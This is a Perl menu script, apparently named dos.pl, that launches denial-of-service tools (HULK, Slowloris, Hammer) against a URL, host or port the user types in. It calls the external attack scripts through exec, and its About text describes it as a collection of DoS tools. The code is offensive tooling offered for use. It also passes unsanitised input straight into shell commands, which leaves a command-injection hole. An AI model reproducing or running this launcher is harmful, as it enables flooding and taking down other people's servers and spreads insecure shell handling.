#!/usr/bin/perl
use strict;
use warnings;
use Term::ANSIScreen qw(cls);
use Term::ANSIColor;
print color('yellow');
print"You should install Go, Python 2, Python 3 and Perl to run all features of this program.\n";
print color('red');
print"                                   \n";
print"    _/_/_/                _/_/_/   \n";
print"   _/    _/    _/_/    _/          \n";
print"  _/    _/  _/    _/    _/_/       \n";
print" _/    _/  _/    _/        _/      \n";
print"_/_/_/      _/_/    _/_/_/         \n";
print"                                  \n";
print"                                   \n";
print color('cyan');
print" 1: HTTP Unbearable Loader King (Go)\n";
print" 2: Slowloris (Python)\n";
print" 3: Hammer (Python)\n";
print" 4: Slowloris (Perl)\n";
print" 5: HULK (Python)\n";
print" 6: HULK (for 'safe' option)\n";
print" 9: About\n";
print" 0: Exit\n";
print color('green');
print "Choose your option by pressing numbers:\n";
my $choice = <>;
chomp $choice;
if ($choice eq 1) {
print "Enter your link (with http or https):\n";
my $input = <>;
chomp $input;
my $dos0=exec "go run hulk.go -site $input";
chomp $dos0;
}
elsif ($choice eq 2) {
print "Enter the hostname (without http or https):\n";
my $input2 = <>;
chomp $input2;
print "Port to Attack:";
my $input3 = <>;
chomp $input3;
my $dos1=exec "python3 slowloris.py -p $input3 $input2";
chomp $dos1;
}
elsif ($choice eq 3) {
print "Enter the IP of server (You can check by ping.):";
my $ip = <>;
chomp $ip;
print "Enter the port you'll attack:";
my $port = <>;
chomp $port;
print "Enter the turbo value (Default: 135)";
my $turbo = <>;
chomp $turbo;
my $dos2=exec "python3 hammer.py -s $ip -p $port -t $turbo";
chomp $dos2;
}
elsif ($choice eq 4) {
print "Enter the URL or DNS (without http or https):\n";
my $dns = <>;
chomp $dns;
my $dos3=exec "perl slowloris.pl -dns $dns";
chomp $dos3;
}
elsif ($choice eq 5) {
print "Enter the URL (with http or https):\n";
my $url = <>;
chomp $url;
my $dos4=exec "python2 hulk.py $url";
chomp $dos4;
}
elsif ($choice eq 6) {
print "This is for 'safe' option.\n";
print "Enter the URL (with http or https):\n";
my $host = <>;
chomp $host;
my $dos5=exec "python2 hulk.py $host safe";
chomp $dos5;
}
elsif ($choice eq 9) {
print color('bright_red');
print "This program is created for the collection of DoS tools.\n";
print "Press 1 to return to Main Menu.\n";
my $theinput = <>;
while ($theinput == 1){
my $clear_screen = cls();
print $clear_screen;
exec "perl dos.pl";
}
while ($theinput ne 1){
my $clear_screen = cls();
print $clear_screen;
print color('bright_magenta');
print "Re-run the script by 'perl dos.pl'\n";
last;
END;
}
}
elsif ($choice eq 0) {
print color ('red');
print "Bye!\n\n";
END;
}
else{
my $clear_screen = cls();
print $clear_screen;
exec "perl dos.pl";
}
